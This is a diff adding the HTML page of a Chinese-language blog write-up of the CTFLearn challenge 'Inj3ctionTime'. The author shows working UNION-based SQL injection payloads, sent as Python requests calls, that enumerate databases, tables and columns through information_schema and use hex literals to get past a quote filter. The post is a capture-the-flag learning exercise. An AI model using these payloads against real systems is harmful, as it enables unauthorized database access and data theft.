@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://SGS4ever.github.io/2020/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%89%8B%E5%86%8C/" />
+  <link rel="next" href="https://SGS4ever.github.io/2020/07601/" />
+  <link rel="canonical" href="https://SGS4ever.github.io/2020/injectiontime/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           CTFLearn-Inj3ctionTime | XR_G&#39;s Blog
+       
+  </title>
+  <meta name="title" content="CTFLearn-Inj3ctionTime | XR_G&#39;s Blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTFLearn-Inj3ctionTime"/>
+<meta name="twitter:description" content="题目链接：(https://ctflearn.com/challenge/149)
+ 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;
+  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2&#34;}) soup = BeautifulSoup(ret.text, &#39;lxml&#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 or 1=1&#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3&#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3,4&#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段："/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFLearn-Inj3ctionTime",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/SGS4ever.github.io\/2020\/injectiontime\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/SGS4ever.github.io\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "ctf, write-up",
+  "wordcount":  190 ,
+  "url": "https:\/\/SGS4ever.github.io\/2020\/injectiontime\/",
+  "datePublished": "2020-09-18T00:00:00\u002b00:00",
+  "dateModified": "2020-09-18T00:00:00\u002b00:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "XR_G",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https:\/\/SGS4ever.github.io\/logo.png",
+      "width":  127 ,
+      "height":  47 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "XR_G"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://SGS4ever.github.io/">主页</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博文</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/about" title="">关于作者</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://SGS4ever.github.io/">XR_G&#39;s Blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">博文</a>
+                
+                <a class="menu-item" href="/categories/" title="">分类</a>
+                
+                <a class="menu-item" href="/about" title="">关于作者</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">CTFLearn-Inj3ctionTime</h1>
+        <div class="post-meta">
+            Written by <a href="https://SGS4ever.github.io/" rel="author">XR_G</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2020-09-18 >18 September 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://SGS4ever.github.io/categories/ctf/"> ctf </a>
+                        <a href="https://SGS4ever.github.io/categories/write-up/"> write-up </a>
+                        
+                </span>
+                <i class="iconfont icon-timer"></i>
+                1 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p><em>题目链接：(<a href="https://ctflearn.com/challenge/149">https://ctflearn.com/challenge/149</a>)</em></p>
+<blockquote>
+<p>此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;</p>
+</blockquote>
+<ol>
+<li>根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。</li>
+</ol>
+<blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;2&#34;</span>})
+soup <span style="color:#f92672">=</span> BeautifulSoup(ret<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;lxml&#39;</span>)
+<span style="color:#66d9ef">print</span>(soup<span style="color:#f92672">.</span>prettify())
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: Doodle</span>
+<span style="color:#75715e"># Bread: Poodle</span>
+<span style="color:#75715e"># Color: Pink</span>
+</code></pre></div><p>在数字2之后附上简单的布尔表达式，观察结果。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;2 or 1=1&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用</span>
+</code></pre></div></blockquote>
+<ol start="2">
+<li>至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。</li>
+</ol>
+<blockquote>
+<p>首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;-2 union select 1,2,3&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># 0 results</span>
+</code></pre></div><p>结果表明3个字段是不对的，那么再增加：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;-2 union select 1,2,3,4&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: 2</span>
+<span style="color:#75715e"># Breed: 1</span>
+<span style="color:#75715e"># Color: 3</span>
+</code></pre></div><p>非常Nice，不仅表明了查询的结果有<strong>四个字段</strong>，而且显示出<strong>每个字段对应的是什么含义</strong>。再试试5个字段：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;2 union select 1,2,3,4,5&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># 0 results</span>
+</code></pre></div><p>已经明确了，系统做的每一次查询结果就是有<strong>四个字段</strong>，只需要将<strong>对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来</strong>。</p>
+</blockquote>
+<blockquote>
+<p>开始查看数据库名，使用<strong>database()函数</strong>或者<strong>information_schema数据库维护的信息</strong>。</p>
+<blockquote>
+<ul>
+<li>information_schema 是MySQL自带的数据库，它保存着MySQL服务器维护的所有<strong>其他数据库的信息</strong>，如数据库名、数据库的表、表栏的数据类型与访问权限等。</li>
+</ul>
+</blockquote>
+<p>在此仅记录第二种办法。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: Information_schema, webeight</span>
+<span style="color:#75715e"># Breed: 1</span>
+<span style="color:#75715e"># Color: 3</span>
+</code></pre></div><p>这里，group_concat使得查询结果是批量的，而第二个字段对应地显示出了我们希望看到的——所有的数据库名。</p>
+</blockquote>
+<blockquote>
+<p>开始查询webeight数据库中的数据表。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;https://web.ctflearn.com/web8/&#34;</span>, 
+                   params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4&#34;</span>})
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: w0w_y0u_f0und_m3,webeight</span>
+<span style="color:#75715e"># Breed: 1</span>
+<span style="color:#75715e"># Color: 3</span>
+</code></pre></div><p>这里需要注意，本来第二个字段的SQL语句应该是：</p>
+<p><code>select group_concat(table_name) from information_schema.tables where table_schema='webeight'</code></p>
+<p>但是，这道题中的<strong>单引号是被过滤的！</strong></p>
+<p>于是采用十六进制来表示<code>webeight</code>这个字符串，直接转换，<!-- raw HTML omitted -->不需要考虑什么大端小端存储<!-- raw HTML omitted -->-。（我在说什么x）</p>
+<p>于是就有了上面的那句：</p>
+<p><code>select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874</code></p>
+<p>得到的结果也是比较漂亮的，找到了关键的表。</p>
+</blockquote>
+<blockquote>
+<p>得到表之后，要查找字段了。方法差不多，总的来说就是在折腾information_schema库中存储的信息而已。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">select group_concat(column_name) <span style="color:#f92672">from</span> information_schema.columns where table_schema<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7765626569676874</span> <span style="color:#f92672">and</span> table_name<span style="color:#f92672">=</span><span style="color:#ae81ff">0x7730775f7930755f6630756e645f6d33</span>
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: f0und_m3</span>
+<span style="color:#75715e"># ...</span>
+</code></pre></div><p>这里是第二个字段要填入的SQL语句，比较长，因此不写出完整的python语句，以免阻碍观瞻。</p>
+<p>此处要注意，group_concat()中的字段名<strong>column_name</strong>是一定不能改的，包括之前的所有SQL语句，<strong>在查询information库的时候，选用的字段名要按照规定的来，否则必然得不到结果。</strong></p>
+</blockquote>
+<blockquote>
+<p>以上已经得到了目标表的目标字段，使用最后一个简单的查询结束这道题：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">select f0und_m3 <span style="color:#f92672">from</span> w0w_y0u_f0und_m3
+
+<span style="color:#75715e"># Output:</span>
+<span style="color:#75715e"># Name: abctf{uni0n_1s_4_gr34t_c0mm4nd}</span>
+<span style="color:#75715e"># ...</span>
+</code></pre></div></blockquote>
+<ol start="3">
+<li>总结</li>
+</ol>
+<blockquote>
+<p>这道题光是题解就已经写了将近一小时，只希望日后有人读起时不要忘记作者作为一个菜鸡在这题面前苦苦挣扎的一下午。SQL注入真是一个漫长而复杂的过程，而其中多数难点就在于搞安全的人对于数据库语句、底层实现等的不了解；我在今天才接触到了information_schema、group_concat等诸多知识，想来这作为一个练习还是使我获益颇多，但今后，我还是更愿意投靠自动化工具的阵营&hellip; &hellip;</p>
+</blockquote>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>XR_G </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>190</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=https%3a%2f%2fSGS4ever.github.io%2f2020%2finjectiontime%2f&amp;text=CTFLearn-Inj3ctionTime&amp;via=HuangruiLee" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+      
+      
+      
+      
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+             
+            <p class="copyright-item">
+                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://SGS4ever.github.io/tags/ctf/">
+                    #ctf</a></span>
+            
+            <span class="tag"><a href="https://SGS4ever.github.io/tags/write-up/">
+                    #write-up</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://SGS4ever.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://SGS4ever.github.io/2020/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%89%8B%E5%86%8C/" class="prev" rel="prev" title="博客搭建手册"><i class="iconfont icon-dajiantou"></i>&nbsp;博客搭建手册</a>
+         
+        
+        <a href="https://SGS4ever.github.io/2020/07601/" class="next" rel="next" title="CTFLearn-07601">CTFLearn-07601&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+      <div id="gitalk-container"></div>
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" crossorigin="anonymous">
+      <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" crossorigin="anonymous"></script>
+      <script type="text/javascript">
+          var gitalk = new Gitalk({
+              id: '2020-09-18 00:00:00 \u002b0000 UTC',
+              title: 'CTFLearn-Inj3ctionTime',
+              clientID: '',
+              clientSecret: '',
+              repo: 'BlogComments',
+              owner: 'SGS4ever',
+              admin: ['SGS4ever'],
+              body: decodeURI(location.href)
+          });
+          gitalk.render('gitalk-container');
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://github.com/gitalk/gitalk">comments powered by gitalk.</a></noscript>
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2020 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://SGS4ever.github.io/">XR_G</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
